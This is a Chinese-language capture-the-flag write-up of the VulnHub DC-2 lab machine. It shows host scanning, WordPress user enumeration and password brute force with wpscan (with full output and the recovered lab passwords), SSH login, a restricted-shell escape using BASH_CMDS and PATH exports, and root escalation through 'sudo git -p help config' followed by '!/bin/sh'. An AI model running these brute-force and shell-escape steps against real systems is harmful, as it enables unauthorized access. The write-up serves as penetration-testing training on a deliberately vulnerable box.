# DC2：渗透实战

- 下载地址:

  ```
  下载地址：https://vulnhub.com/entry/dc-2,311/
  ```

  

- 攻击机ip：192.168.200.150

  ### 主机发现

  - 使用nmap扫描当前网段

    ![image-20240309114839348](C:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20240309114839348.png)

- 对照DC2的MAC地址，发现目标机的IP为`192.168.200.151`，并对该主机进行详细扫描

  ![image-20240309115148336](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240309115148336.png)

### 端口详情

| PORT      | STATE | SERVICE | VERSION                                      |
| --------- | ----- | ------- | -------------------------------------------- |
|80/tcp   |open | http  |  Apache httpd 2.4.10 ((Debian))2.0) |
| 7744/tcp |open | ssh  |OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)|

- 发现80端口开着，那么直接进入网站首页查看，找到了flag 1。  （注意：这里需要去`/etc/hosts`中添加`192.168.200.151 dc-2` ，否则访问不了该网站）

  

![image-20240309120200639](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240309120200639.png)

- flag 1 说我们的字典可能不会起作用，说我们需要用到`cewl`，那直接到kali中使用cewl爬行这个网站生成一个新的字典

  ![image-20240309120957999](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240309120957999.png)

### 指纹识别

- 查看该网站指纹信息，发现使用的是wordpress

![image-20240309121129972](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240309121129972.png)

- 之前学过该网站有一个专用的扫描器`wpscan` ,那么直接开扫

```
──(kali💋kali)-[~]
└─$ wpscan --url http://dc-2 -e vt,vp,u --plugins-detection mixed
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://dc-2/ [192.168.200.151]
[+] Started: Sat Mar  9 04:06:20 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.10 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://dc-2/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).
 | Found By: Rss Generator (Passive Detection)
 |  - http://dc-2/index.php/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>
 |  - http://dc-2/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://dc-2/wp-content/themes/twentyseventeen/
 | Last Updated: 2024-01-16T00:00:00.000Z
 | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.5
 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: 'Version: 1.2'

[+] Enumerating Vulnerable Plugins (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:06 <===========================================================================> (7337 / 7337) 100.00% Time: 00:00:06
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:00 <=============================================================================> (652 / 652) 100.00% Time: 00:00:00
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===============================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] jerry
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Mar  9 04:06:31 2024
[+] Requests Done: 8021
[+] Cached Requests: 40
[+] Data Sent: 1.98 MB
[+] Data Received: 1.351 MB
[+] Memory used: 277.395 MB
[+] Elapsed time: 00:00:11
                                                                                                                                                             
┌──(kali💋kali)-[~]
└─$ 

```

- 扫出来三个用户分别是`tom`、`jerry`、`admin`，直接把他们写进字典里，到时候用来爆破

  ![image-20240309122046832](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240309122046832.png)

- 接下来只要找到该网站后台就可以进行爆破了，那么因为指纹识别的时候就知道该网站cms使用的wp，直接搜索wp后台即可，得到该网站后台为` dc-2/wp-admin/`,那么直接进入。

  ![image-20240309122915859](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240309122915859.png)

  ### 账密爆破

- 万事俱备，使用wpscan进行账密爆破

  ```
  ──(kali💋kali)-[~]
  └─$ wpscan --url http://dc-2 -U dc2_user.dic -P dc2_pass.dic 
  _______________________________________________________________
           __          _______   _____
           \ \        / /  __ \ / ____|
            \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
             \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
              \  /\  /  | |     ____) | (__| (_| | | | |
               \/  \/   |_|    |_____/ \___|\__,_|_| |_|
  
           WordPress Security Scanner by the WPScan Team
                           Version 3.8.22
         Sponsored by Automattic - https://automattic.com/
         @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
  _______________________________________________________________
  
  [+] URL: http://dc-2/ [192.168.200.151]
  [+] Started: Sat Mar  9 04:19:32 2024
  
  Interesting Finding(s):
  
  [+] Headers
   | Interesting Entry: Server: Apache/2.4.10 (Debian)
   | Found By: Headers (Passive Detection)
   | Confidence: 100%
  
  [+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php
   | Found By: Direct Access (Aggressive Detection)
   | Confidence: 100%
   | References:
   |  - http://codex.wordpress.org/XML-RPC_Pingback_API
   |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
   |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
   |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
   |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
  
  [+] WordPress readme found: http://dc-2/readme.html
   | Found By: Direct Access (Aggressive Detection)
   | Confidence: 100%
  
  [+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php
   | Found By: Direct Access (Aggressive Detection)
   | Confidence: 60%
   | References:
   |  - https://www.iplocation.net/defend-wordpress-from-ddos
   |  - https://github.com/wpscanteam/wpscan/issues/1299
  
  [+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).
   | Found By: Rss Generator (Passive Detection)
   |  - http://dc-2/index.php/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>
   |  - http://dc-2/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>
  
  [+] WordPress theme in use: twentyseventeen
   | Location: http://dc-2/wp-content/themes/twentyseventeen/
   | Last Updated: 2024-01-16T00:00:00.000Z
   | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt
   | [!] The version is out of date, the latest version is 3.5
   | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10
   | Style Name: Twenty Seventeen
   | Style URI: https://wordpress.org/themes/twentyseventeen/
   | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
   | Author: the WordPress team
   | Author URI: https://wordpress.org/
   |
   | Found By: Css Style In Homepage (Passive Detection)
   |
   | Version: 1.2 (80% confidence)
   | Found By: Style (Passive Detection)
   |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: 'Version: 1.2'
  
  [+] Enumerating All Plugins (via Passive Methods)
  
  [i] No plugins Found.
  
  [+] Enumerating Config Backups (via Passive and Aggressive Methods)
   Checking Config Backups - Time: 00:00:00 <==============================================================================> (137 / 137) 100.00% Time: 00:00:00
  
  [i] No Config Backups Found.
  
  [+] Performing password attack on Xmlrpc against 3 user/s
  [SUCCESS] - jerry / adipiscing                                                                                                                               
  [SUCCESS] - tom / parturient                                                                                                                                 
  Trying admin / find Time: 00:00:29 <================================================                                     > (647 / 1125) 57.51%  ETA: ??:??:??
  
  [!] Valid Combinations Found:
   | Username: jerry, Password: adipiscing
   | Username: tom, Password: parturient
  
  [!] No WPScan API Token given, as a result vulnerability data has not been output.
  [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
  
  [+] Finished: Sat Mar  9 04:20:06 2024
  [+] Requests Done: 820
  [+] Cached Requests: 5
  [+] Data Sent: 364.505 KB
  [+] Data Received: 751.883 KB
  [+] Memory used: 252.809 MB
  [+] Elapsed time: 00:00:33
                                                                                                                                                               
  ┌──(kali💋kali)-[~]
  └─$ 
  
  ```

  

- 得到两个可登录的账户：

  ```
  [+] Performing password attack on Xmlrpc against 3 user/s
  [SUCCESS] - jerry / adipiscing                                                     [SUCCESS] - tom / parturient  
  ```

- 之前扫描端口的时候还发现了7744的ssh端口，那么也对该端口进行爆破

  ![image-20240309124028215](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240309124028215.png)

- 得到tom用户，直接使用ssh登录

```
login: tom   password: parturient
```

![image-20240309124538315](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240309124538315.png)

### 限制绕过

- 进去后发现被安全策略给限制使用命令了，尝试一下限制绕过

```
BASH_CMDS[a]=/bin/bash
导入环境变量：
export PATH=$PATH:/bin/
export PATH=$PATH:/usr/bin
```

- 发现绕过成功，信息收集一下，看到flag3

![image-20240309125314987](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240309125314987.png)

- 之前还拿到个jerry的用户，直接切换过去，再信息收集一波，发现了flag4

  ![image-20240309125835865](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240309125835865.png)



### 提权

- 尝试一下suid提权，发现sudo命令具有suid权限，查看后发现git命令可以不需要密码就拥有root权限

  ```
  find / -perm -u=s 2>/dev/null
  ```

  

  ![image-20240309130135719](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240309130135719.png)

- 那么直接尝试使用git提权,首先使用`sudo git -p help config `进入到类似编辑器的界面，然后在该界面键入`！/bin/sh`就可以成功提取到root权限

```
sudo git -p help config
!/bin/sh
```

![image-20240309130710913](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240309130710913.png)

- 直接进入root目录成功找到最终flag

![image-20240309130911412](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240309130911412.png)
